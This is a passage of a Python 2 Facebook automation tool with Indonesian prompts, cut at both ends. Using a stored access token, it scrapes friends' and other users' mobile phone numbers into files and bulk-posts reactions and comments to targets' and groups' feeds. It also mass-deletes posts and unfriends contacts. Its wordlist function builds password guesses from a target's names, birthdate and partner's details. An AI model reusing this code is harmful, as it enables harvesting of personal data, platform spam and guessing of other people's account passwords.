        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            noms = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[0mNama\x1b[0m   :\x1b[77;1m ' + z['name']
                    print '\x1b[0mTelepon\x1b[0m : \x1b[77;1m' + z['mobile_phone']
                    print
                except KeyError:
                    pass
            print '\n\r\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[0mJumlah No Telepon\x1b[77;1m %s' % len(hp)
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + noms
            no.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak bisa menyimpan berkas')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except KeyError:
            os.remove(noms)
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNomor Telepon tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            idt = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Teman \x1b[0m: \x1b[77;1m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[0m[\x1b[95;1m\xe2\x9c\x93\x1b[0m] \x1b[0mDari\x1b[0m :\x1b[77;1m ' + op['name']
            except KeyError:
                print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTeman tidak ditemukan')
                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                grab()
            noms = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[0mext(file.txt) \x1b[0m: \x1b[77;1m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[0mNama\x1b[0m   :\x1b[77;1m ' + z['name']
                    print '\x1b[0mTelepon\x1b[0m : \x1b[77;1m' + z['mobile_phone']
                    print
                except KeyError:
                    pass
            print '\n\r\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mJumlah No Telepon\x1b[77;1m %s' % len(hpfromfriends)
            print '\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSimpan Berkas \x1b[77;1m: \x1b[0m' + noms
            no.close()
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMembuat berkas gagal')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            grab()
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()

def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mTanggapi postingan Target')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mTanggapi postingan Grup')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mKomentari postingan Target')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mKomentari postingan Grup')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mHapus postingan Masal')
    print ('\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mTerima permintaan Teman')
    print ('\x1b[0m[\x1b[96;1m7\x1b[0m] \x1b[77;1mHapus Pertemanan')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    bot_select()

def bot_select():
    bots = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if bots == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        bot_select()
    else:
        if bots == '01' or bots ==  '1':
            menu_react()
        else:
            if bots == '02' or bots == '2':
                grup_react()
            else:
                if bots == '03' or bots ==  '3':
                    bot_komen()
                else:
                    if bots == '04' or bots == '4':
                        grup_komen()
                    else:
                        if bots == '05' or bots == '5':
                            deletepost()
                        else:
                            if bots == '06' or bots == '6':
                                accept()
                            else:
                                if bots == '07' or bots == '7':
                                    unfriend()
                                else:
                                    if bots == '00' or bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + bots + ' \x1b[77;1mTidak ditemukan'
                                        bot_select()

def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mLike')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mLove')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mWow')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mHaha')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mSad')
    print ('\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAngry')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    react_select()

def react_select():
    global tipe
    react = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if react == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        react_select()
    else:
        if react == '01' or react == '1':
            tipe = 'LIKE'
            react()
        else:
            if react == '02' or react == '2':
                tipe = 'LOVE'
                react()
            else:
                if react == '03' or react == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if react == '04' or react == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if react == '05' or react == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if react == '06' or react == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if react == '00' or react == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + react + ' \x1b[77;1mTidak ditemukan'
                                    react_select()

def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Target \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mJumalah \x1b[77;1m:\x1b[0m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + y[:10].replace('\n', ' ') + '... \x1b[0m] \x1b[77;1m' + tipe

            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai \x1b[0m' + str(len(reaksi))
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
        except KeyError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()

def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mLike')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mLove')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mWow')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mHaha')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mSad')
    print ('\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAngry')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mBack')
    print
    reactg_select()

def reactg_select():
    global tipe
    action = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if action == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        reactg_select()
    else:
        if action == '01' or action == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if action == '02' or action == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if action == '03' or action == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if action == '04' or action == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if action == '05' or action == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if action == '06' or action == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if action == '00' or action == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + action + ' \x1b[77;1mTidak ditemukan'
                                    reactg_select()

def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Group \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mJumlah \x1b[77;1m:\x1b[0m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama Grup \x1b[0m:\x1b[77;1m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print ''
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + y[:10].replace('\n', ' ') + '... \x1b[0m] \x1b[77;1m' + tipe
            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai \x1b[0m' + str(len(reaksigrup))
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
        except KeyError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()

def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print "'\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGunakan \x1b[0m'<>' \x1b[77;1m Untuk Garis Baru"
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Target \x1b[0m:\x1b[77;1m ')
        km = raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mKomentar  \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mJumlah \x1b[0m:\x1b[77;1m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + km[:10].replace('\n', ' ') + '... \x1b[0m]'
            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai \x1b[0m' + str(len(komen))
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
        except KeyError:
            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID tidak ditemukan'
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()

def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print "\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGunakan \x1b[0m'<>' \x1b[77;1mUntuk Garis Baru"
        ide = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Group  \x1b[0m:\x1b[77;1m ')
        km = raw_input('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mKomentar \x1b[0m:\x1b[77;1m ')
        limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mJumlah \x1b[0m:\x1b[77;1m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama Grup \x1b[0m:\x1b[77;1m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print ''
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1m' + km[:10].replace('\n', ' ') + '... \x1b[0m]'
            print
            print '\r\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai \x1b[0m' + str(len(komengrup))
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
        except KeyError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mID tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()

def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mDari \x1b[0m: \x1b[77;1m %s' % nama
    write ('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMemulai menghapus status\x1b[77;1m ...')
    print ''
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[0m[\x1b[77;1m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0m] \x1b[77;1mGagal'
        except TypeError:
            print '\x1b[0m[\x1b[77;1m' + id[:10].replace('\n', ' ') + '...' + '\x1b[0m] \x1b[77;1mTerhapus'
            piro += 1
        except requests.exceptions.ConnectionError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKoneksi terganggu')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
    print ('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai')
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    menu_bot()

def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak tersedia')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    limit = raw_input('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[0mJumlah \x1b[0m:\x1b[77;1m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak ada permintaan pertemannan')
        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
        menu_bot()
    wrute ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    print
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama  \x1b[0m:\x1b[77;1m ' + i['from']['name']
            print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + i['from']['id'] + '\x1b[77;1m Failed'
            print
        else:
            print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama  \x1b[0m:\x1b[77;1m ' + i['from']['name']
            print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mID    \x1b[0m:\x1b[77;1m ' + i['from']['id'] + '\x1b[77;1m Success'
            print
    print ('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai')
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    menu_bot()

def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
        print
        print ('\x1b[77;1mTekan [ ctrl-c ] untuk berhenti')
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[0m[\x1b[77;1mMengapus\x1b[0m] \x1b[77;1m' + nama + ' => ' + id
        except IndexError:
            pass
        except KeyboardInterrupt:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerhenti')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_bot()
    print ('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelesai')
    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
    menu_bot()

def other():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mMembuat Status')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mMembuat Wordlist')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mAkun Checker')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mLihat Grup Saya')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mProfil Guard')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    other_select()

def other_select():
    other = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if other == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        other_select()
    else:
        if other == '01' or other == '1':
            status()
        else:
            if other == '02' or other == '2':
                wordlist()
            else:
                if other == '03' or other == '3':
                    check_account()
                else:
                    if other == '04' or other == '4':
                        grupme()
                    else:
                        if other == '05' or other == '5':
                            guard()
                        else:
                            if other == '00' or other == '0':
                                menu()
                            else:
                                print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + other + ' \x1b[77;1mTidak ditemukan'
                                other_select()

def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    msg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mTulis status \x1b[0m:\x1b[77;1m ')
    if msg == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mJangan Kosong')
        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
        print
        print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mID Status\x1b[77;1m : \x1b[0m' + op['id']
        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
        other()

def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            print ('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mIsi data target lengkap di bawah ini')
            print
            a = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama depan \x1b[77;1m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama tengah \x1b[77;1m: ')
            c = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama belakang \x1b[77;1m: ')
            d = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mNama panggilan \x1b[77;1m: ')
            e = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mTanggal lahir >\x1b[0mex: |DDMMYY| \x1b[77;1m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print
            print ('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mJika kamu jomblo, lewati aja')
            print
            i = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mNama pacar \x1b[77;1m: ')
            j = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mNama panggilan pacar \x1b[77;1m: ')
            k = raw_input('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[0mTanggal lahir pacara >\x1b[0mex: |DDMMYY| \x1b[77;1m: ')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, 